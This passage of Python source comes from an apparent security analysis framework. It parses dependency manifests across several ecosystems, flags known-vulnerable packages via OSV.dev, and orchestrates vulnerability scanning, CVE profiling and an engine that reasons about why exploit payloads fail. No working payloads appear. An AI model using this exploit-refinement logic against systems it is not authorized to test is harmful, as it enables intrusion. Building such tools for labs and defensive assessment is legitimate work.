            ("server-side request",     "ssrf"),
            ("ssrf",                    "ssrf"),
            ("cross-site scripting",    "xss"),
            ("cross site scripting",    "xss"),
            (" xss",                    "xss"),
            ("path travers",            "path_traversal"),
            ("directory travers",       "path_traversal"),
            ("deserialization",         "deserialization"),
            ("prototype pollut",        "prototype_pollution"),
            ("regex denial",            "redos"),
            ("regular expression",      "redos"),
            ("open redirect",           "open_redirect"),
            ("csrf",                    "csrf"),
            ("auth bypass",             "auth_bypass"),
            ("authentication bypass",   "auth_bypass"),
            ("arbitrary file",          "arbitrary_file_write"),
        ):
            if kw in combined:
                return vc
        return "unknown"

    def flag_known_vulnerable(self, report: "DependencyReport") -> List[Dict[str, str]]:
        """
        Cross-reference the dependency report against known CVEs:
        1. Local hardcoded list (fast, offline)
        2. OSV.dev API (comprehensive, requires network; skipped on timeout)
        Returns deduplicated flagged packages with CVE ID, vuln class, and upgrade advice.
        """
        seen: set = set()
        flags: List[Dict[str, str]] = []

        def _add(rec, cve_id, vuln_class):
            key = (rec.name.lower(), cve_id)
            if key in seen:
                return
            seen.add(key)
            flags.append({
                "package":    rec.name,
                "version":    rec.version,
                "manager":    rec.manager,
                "cve_id":     cve_id,
                "vuln_class": vuln_class,
                "source_file": rec.source_file,
                "advice":     f"Upgrade {rec.name} — {cve_id} ({vuln_class})",
            })

        for rec in report.dependencies:
            # 1. Hardcoded DB (offline, instant)
            for manager, pkg, ver_prefix, cve_id, vuln_class in self._KNOWN_VULNS:
                if (rec.manager == manager
                        and rec.name.lower() == pkg.lower()
                        and rec.version.lstrip("^~>=").startswith(ver_prefix)):
                    _add(rec, cve_id, vuln_class)

        # 2. OSV.dev batch query (one HTTP call for all queryable packages)
        osv_queries = []
        osv_recs = []
        for rec in report.dependencies:
            osv_eco = self._OSV_ECOSYSTEM.get(rec.manager, "")
            ver = rec.version.lstrip("^~>=")
            if osv_eco and ver and ver not in ("", "*", "latest"):
                osv_queries.append({"name": rec.name, "ecosystem": osv_eco, "version": ver})
                osv_recs.append(rec)

        if osv_queries:
            batch_results = self._query_osv_batch(osv_queries)
            for rec, vulns in zip(osv_recs, batch_results):
                for vuln in vulns:
                    cve_id = next(
                        (a for a in vuln.get("aliases", []) if a.upper().startswith("CVE-")),
                        vuln.get("id", ""),
                    )
                    if cve_id:
                        _add(rec, cve_id, self._osv_vuln_class(vuln))

        return flags

    def _parse_file(self, fpath: str, rel: str, fname: str) -> List[DependencyRecord]:
        """Dispatch to the right parser based on filename."""
        if fname == "package.json":
            return self._parse_package_json(fpath, rel)
        if fname in ("requirements.txt", "requirements-dev.txt", "requirements_dev.txt"):
            return self._parse_requirements_txt(fpath, rel,
                                                 dev_only="dev" in fname.lower())
        if fname == "pyproject.toml":
            return self._parse_pyproject_toml(fpath, rel)
        if fname == "composer.json":
            return self._parse_composer_json(fpath, rel)
        if fname == "pom.xml":
            return self._parse_pom_xml(fpath, rel)
        if fname in ("Gemfile", "Gemfile.lock"):
            return self._parse_gemfile(fpath, rel)
        if fname == "Cargo.toml":
            return self._parse_cargo_toml(fpath, rel)
        if fname == "go.mod":
            return self._parse_go_mod(fpath, rel)
        return []

    # ── npm / yarn ────────────────────────────────────────────────────────────
    def _parse_package_json(self, fpath: str, rel: str) -> List[DependencyRecord]:
        try:
            data = json.loads(open(fpath, encoding="utf-8").read())
        except Exception:
            return []
        recs = []
        for section, dev in (("dependencies", False), ("devDependencies", True),
                              ("peerDependencies", False), ("optionalDependencies", False)):
            for name, ver in (data.get(section) or {}).items():
                recs.append(DependencyRecord(name=name, version=str(ver),
                                              manager="npm", source_file=rel, dev_only=dev))
        return recs

    # ── pip ───────────────────────────────────────────────────────────────────
    def _parse_requirements_txt(self, fpath: str, rel: str,
                                  dev_only: bool = False) -> List[DependencyRecord]:
        recs = []
        for line in open(fpath, encoding="utf-8", errors="replace"):
            line = line.strip()
            if not line or line.startswith("#") or line.startswith("-"):
                continue
            m = re.match(r"([A-Za-z0-9_.\-]+)\s*([><=!~^]{0,3})\s*([^\s;#]*)", line)
            if m:
                recs.append(DependencyRecord(
                    name=m.group(1), version=(m.group(2) + m.group(3)).strip(),
                    manager="pip", source_file=rel, dev_only=dev_only,
                ))
        return recs

    def _parse_pyproject_toml(self, fpath: str, rel: str) -> List[DependencyRecord]:
        content = open(fpath, encoding="utf-8", errors="replace").read()
        recs = []
        # [project] dependencies = ["name>=ver", ...]
        for m in re.finditer(
            r"dependencies\s*=\s*\[(.*?)\]", content, re.DOTALL
        ):
            for dep in re.findall(r"""['"]([A-Za-z0-9_.\-]+)\s*([><=!~^][^\s'"]*)?""",
                                   m.group(1)):
                recs.append(DependencyRecord(name=dep[0], version=dep[1] or "",
                                              manager="pip", source_file=rel))
        return recs

    # ── Composer (PHP) ────────────────────────────────────────────────────────
    def _parse_composer_json(self, fpath: str, rel: str) -> List[DependencyRecord]:
        try:
            data = json.loads(open(fpath, encoding="utf-8").read())
        except Exception:
            return []
        recs = []
        for section, dev in (("require", False), ("require-dev", True)):
            for name, ver in (data.get(section) or {}).items():
                if name == "php":
                    continue
                recs.append(DependencyRecord(name=name, version=str(ver),
                                              manager="composer", source_file=rel, dev_only=dev))
        return recs

    # ── Maven (Java) ──────────────────────────────────────────────────────────
    def _parse_pom_xml(self, fpath: str, rel: str) -> List[DependencyRecord]:
        content = open(fpath, encoding="utf-8", errors="replace").read()
        recs = []
        for m in re.finditer(
            r"<dependency>\s*<groupId>([^<]+)</groupId>\s*<artifactId>([^<]+)</artifactId>"
            r"(?:\s*<version>([^<]*)</version>)?",
            content, re.DOTALL
        ):
            name = f"{m.group(1).strip()}:{m.group(2).strip()}"
            ver  = (m.group(3) or "").strip()
            # Check if test scope
            dev = bool(re.search(
                r"<scope>test</scope>",
                content[m.start(): m.start() + 500]
            ))
            recs.append(DependencyRecord(name=name, version=ver,
                                          manager="maven", source_file=rel, dev_only=dev))
        return recs

    # ── Bundler (Ruby) ────────────────────────────────────────────────────────
    def _parse_gemfile(self, fpath: str, rel: str) -> List[DependencyRecord]:
        recs = []
        for line in open(fpath, encoding="utf-8", errors="replace"):
            line = line.strip()
            if line.startswith("#"):
                continue
            # gem 'name', '~> 1.2' or gem "name", ">= 1.0"
            m = re.match(r"""gem\s+['"]([^'"]+)['"]\s*(?:,\s*['"]([^'"]+)['"])?""", line)
            if m:
                recs.append(DependencyRecord(
                    name=m.group(1), version=m.group(2) or "",
                    manager="gem", source_file=rel,
                ))
            # Gemfile.lock: exact versions
            m2 = re.match(r"\s{4}([A-Za-z0-9_\-]+)\s+\(([^)]+)\)", line)
            if m2:
                recs.append(DependencyRecord(
                    name=m2.group(1), version=m2.group(2),
                    manager="gem", source_file=rel,
                ))
        return recs

    # ── Cargo (Rust) ─────────────────────────────────────────────────────────
    def _parse_cargo_toml(self, fpath: str, rel: str) -> List[DependencyRecord]:
        content = open(fpath, encoding="utf-8", errors="replace").read()
        recs = []
        in_deps = False
        in_dev  = False
        for line in content.splitlines():
            stripped = line.strip()
            if stripped in ("[dependencies]", "[workspace.dependencies]"):
                in_deps, in_dev = True, False
            elif stripped in ("[dev-dependencies]", "[build-dependencies]"):
                in_deps, in_dev = True, True
            elif stripped.startswith("["):
                in_deps = False
            elif in_deps:
                m = re.match(r'([A-Za-z0-9_\-]+)\s*=\s*["\']?([^"\'#\n]+)["\']?', stripped)
                if m:
                    recs.append(DependencyRecord(
                        name=m.group(1), version=m.group(2).strip().strip('"\''),
                        manager="cargo", source_file=rel, dev_only=in_dev,
                    ))
        return recs

    # ── Go modules ────────────────────────────────────────────────────────────
    def _parse_go_mod(self, fpath: str, rel: str) -> List[DependencyRecord]:
        recs = []
        for line in open(fpath, encoding="utf-8", errors="replace"):
            m = re.match(r"\s*([a-zA-Z0-9_.\-/]+)\s+(v[^\s]+)", line.strip())
            if m and not line.strip().startswith("//") and not line.strip().startswith("module"):
                recs.append(DependencyRecord(
                    name=m.group(1), version=m.group(2),
                    manager="go", source_file=rel,
                ))
        return recs


# ─────────────────────────── Universal Engine ─────────────────────────────────

class UniversalEngine:
    """
    Orchestrates all six capabilities:
      SourceCodeIntelligence, VulnerabilityIntelligence, CveIntelligence,
      DependencyAnalysis, RemediationEngine, ExploitReasoningEngine.

    Public entry points:
      .analyze_request_error(...)    — fix a failed HTTP request
      .analyze_process_error(...)    — reason about a failed process
      .assess_security(...)          — static security analysis of source
      .profile_cve(...)             — reason about a CVE description
      .analyze_dependencies(...)    — inventory a project's dependencies
      .analyze_exploit_response(...) — reason about a failed exploit attempt
      .reason_about_blocker(...)     — reason about a code-level lab blocker
    """

    def __init__(self):
        self.source_intel  = SourceCodeIntelligence()
        self.vuln_intel    = VulnerabilityIntelligence()
        self.cve_intel     = CveIntelligence()
        self.dep_analysis  = DependencyAnalysis()
        self.remediation   = RemediationEngine(self.source_intel)
        self.exploit_reasoning = ExploitReasoningEngine()

    def analyze_request_error(
        self,
        response: Any,
        current_params: Dict,
        source_dir: str,
        make_request: Callable[[Dict], Any],
        on_step: Optional[Callable[[str], None]] = None,
        max_attempts: int = 3,
    ) -> Tuple[RemediationResult, Dict]:
        """
        Parse an HTTP response, reason about the error, propose + apply fixes,
        retry up to max_attempts. Returns (result, final_params).
        """
        signal = ErrorSignal.from_http(response)
        if signal is None or signal.kind not in (ErrorKind.VALIDATION,):
            return (
                RemediationResult(success=True, attempts=0, fixes_applied=[],
                                  final_signal=signal),
                current_params,
            )
        params = dict(current_params)
        result = self.remediation.remediate(
            signal, params, source_dir, make_request,
            on_step=on_step, max_attempts=max_attempts,
        )
        # Accumulate all param changes into final_params
        for fix in result.fixes_applied:
            params.update(fix.changes)
        return result, params

    def analyze_exploit_response(
        self,
        response_body:    str,
        status_code:      int           = 200,
        vuln_class:       str           = "",
        payload_sent:     str           = "",
        param_name:       str           = "",
        baseline_body:    str           = "",
        source_evidence:  Dict[str, Any] = None,
    ) -> "ExploitAnalysis":
        """
        Reason about a single exploit attempt's response as an exploit developer would.

        Returns an ExploitAnalysis with ranked hypotheses explaining WHY the payload
        did not land (or confirming it did), with concrete fix hints.

        This is a general engine capability — the reasoning chains (AUTH_GATE_FIRED,
        RESOURCE_NOT_FOUND, NONCE_MISMATCH, INJECTION_CONTEXT, FRAMEWORK_PROTECTION)
        are language and framework agnostic.  They apply to any HTTP response from any
        target, not just WordPress or specific CVEs.
        """
        return self.exploit_reasoning.analyze_response(
            response_body=response_body,
            status_code=status_code,
            vuln_class=vuln_class,
            payload_sent=payload_sent,
            param_name=param_name,
            source_evidence=source_evidence or {},
            baseline_body=baseline_body,
        )

    def reason_about_blocker(
        self,
        blocker_description: str,
        source_snippets:     List[str] = None,
    ) -> List["ExploitHypothesis"]:
        """
        Given a human-readable description of a lab blocker (e.g. 'predefined_no_caps fired')
        and optional source code excerpts, return ranked hypotheses with fix hints.

        Useful when the blocker was detected at code level, not from an HTTP response.
        """
        return self.exploit_reasoning.reason_about_lab_blocker(
            blocker_description=blocker_description,
            source_snippets=source_snippets or [],
        )

    def analyze_plugin_source(
        self,
        source_dir: str,
        slug: str = "",
    ) -> "SourceAnalysisHint":
        """
        Pre-probe static analysis of a plugin's source to discover gating conditions,
        required session type, and raw-SQL injection context.  Run this BEFORE the
        first probe so the lab bootstrap can apply the hints immediately — cutting
        failed attempts caused by conditions that are readable from the source.
        """
        return self.exploit_reasoning.analyze_plugin_source(source_dir, slug)

    def analyze_process_error(
        self,
        returncode: int,
        stdout: str,
        stderr: str,
    ) -> ErrorSignal:
        """Parse a subprocess result into a typed ErrorSignal."""
        return ErrorSignal.from_exit(returncode, stdout, stderr)

    def assess_security(
        self,
        source_dir: str,
        endpoint: str = "",
    ) -> List[SecurityFinding]:
        """
        Static security analysis of source_dir.
        Runs all detection modes: auth-sequence, public-endpoint, sink, hardcoded-secrets.
        Returns findings sorted by confidence descending.
        """
        return self.vuln_intel.scan_for_vulnerabilities(source_dir)

    def profile_cve(
        self,
        cve_id_or_description: str,
        fetch_nvd: bool = True,
        timeout: float = 20.0,
    ) -> CveProfile:
        """
        Reason about a CVE: classify vuln class, extract component/version/endpoint hints.
        If cve_id_or_description looks like a CVE ID and fetch_nvd=True, fetches from NVD.
        Otherwise (or on network error), analyzes the description text directly.
        """
        is_id = bool(re.match(r"CVE-\d{4}-\d{4,}$", cve_id_or_description.strip(), re.I))
        if is_id and fetch_nvd:
            profile = self.cve_intel.profile_from_nvd(
                cve_id_or_description.strip().upper(), timeout=timeout
            )
            if profile:
                return profile
        return self.cve_intel.profile_from_description(cve_id_or_description)

    def analyze_dependencies(
        self,
        source_dir: str,
        max_depth: int = 4,
    ) -> DependencyReport:
        """
        Parse all dependency manifests in source_dir and return a structured inventory.
        Covers npm, pip, composer, maven, bundler, cargo, go modules.
        """
        return self.dep_analysis.analyze(source_dir, max_depth=max_depth)

    def full_analysis(
        self,
        source_dir: str,
        cve_ids: Optional[List[str]] = None,
        base_url: str = "http://TARGET",
        max_scan_files: int = 500,
    ) -> FullAnalysisResult:
        """
        Full integrated analysis — the main entry point that connects all five capabilities:

        1. Scan source code for vulnerabilities (VulnerabilityIntelligence)
        2. Build / fetch CVE profiles from NVD (CveIntelligence)
        3. Enrich each CVE profile using scan findings (endpoint_hint, auth_required, confidence)
        4. Generate actionable test strategies with real curl commands per profile
        5. Analyze dependencies and flag known-vulnerable packages (DependencyAnalysis)
        6. Return a FullAnalysisResult combining all five outputs

        Args:
            source_dir:   Path to the source tree to analyze.
            cve_ids:      Optional list of CVE IDs to reason about alongside the scan.
            base_url:     Base URL for generating curl commands in test strategies.
            max_scan_files: Max files to scan (passed to scan_for_vulnerabilities).

        Returns:
            FullAnalysisResult with .findings, .cve_profiles, .test_strategies,
            .dep_report, .vuln_deps, and a .summary string.
        """
        result = FullAnalysisResult(source_dir=source_dir)

        # ── 1. Static security scan ──────────────────────────────────────────────
        result.findings = self.vuln_intel.scan_for_vulnerabilities(
            source_dir, max_files=max_scan_files
        )

        # ── 2. Dependency inventory + known-vulnerable flagging ──────────────────
        result.dep_report = self.dep_analysis.analyze(source_dir)
        result.vuln_deps  = self.dep_analysis.flag_known_vulnerable(result.dep_report)

        # ── 3. CVE profiles — fetch from NVD, fall back to description reasoning ─
        cve_ids = cve_ids or []
        for cid in cve_ids:
            profile = self.cve_intel.profile_from_nvd(cid.upper().strip())
            if profile is None:
                profile = self.cve_intel.profile_from_description(cid)
            if profile:
                result.cve_profiles.append(profile)

        # If no CVE IDs given but scan found findings, synthesise a profile from them
        if not result.cve_profiles and result.findings:
            top = max(result.findings, key=lambda f: f.confidence)
            synth = self.cve_intel.profile_from_description(
                f"{top.vuln_class} vulnerability found in {top.location}"
            )
            result.cve_profiles.append(synth)

        # Also add CVE profiles for vulnerable dependencies (unless already in list)
        existing_ids = {p.cve_id for p in result.cve_profiles}
        for dep in result.vuln_deps:
            dep_cve = dep.get("cve_id", "")
            if dep_cve and dep_cve not in existing_ids:
                dep_profile = self.cve_intel.profile_from_nvd(dep_cve)
                if dep_profile is None:
                    dep_profile = self.cve_intel.profile_from_description(
                        f"{dep.get('vuln_class', 'unknown')} vulnerability in "
                        f"{dep.get('package', '?')} {dep.get('version', '')}"
                    )
                    if dep_profile:
                        dep_profile.cve_id = dep_cve
                if dep_profile:
                    result.cve_profiles.append(dep_profile)
                    existing_ids.add(dep_cve)

        # ── 4. Enrich each profile with scan evidence + generate test strategy ───
        enriched_profiles: List[CveProfile] = []
        for profile in result.cve_profiles:
            ep = self.cve_intel.enrich_profile_from_scan(
                profile, result.findings, source_dir
            )
            enriched_profiles.append(ep)
            result.test_strategies[ep.cve_id] = self.cve_intel.suggest_test_strategy(
                ep, base_url=base_url
            )
        result.cve_profiles = enriched_profiles

        # ── 5. Human-readable summary ────────────────────────────────────────────
        n_findings = len(result.findings)
        n_vuln_deps = len(result.vuln_deps)
        n_cves = len(result.cve_profiles)
        n_steps = sum(len(v) for v in result.test_strategies.values())

        lines = [
            f"=== Full Analysis: {os.path.basename(source_dir)} ===",
            f"  Scan findings:        {n_findings}",
            f"  Vulnerable deps:      {n_vuln_deps}",
            f"  CVE profiles built:   {n_cves}",
            f"  Test strategy steps:  {n_steps}",
        ]
        if result.findings:
            from collections import Counter
            top_classes = Counter(f.vuln_class for f in result.findings).most_common(3)
            lines.append("  Top finding classes:  " + ", ".join(
                f"{cls}({n})" for cls, n in top_classes))
        if result.vuln_deps:
            lines.append("  Vulnerable packages:  " + ", ".join(
                d.get("package", "?") for d in result.vuln_deps[:5]))
        result.summary = "\n".join(lines)

        return result
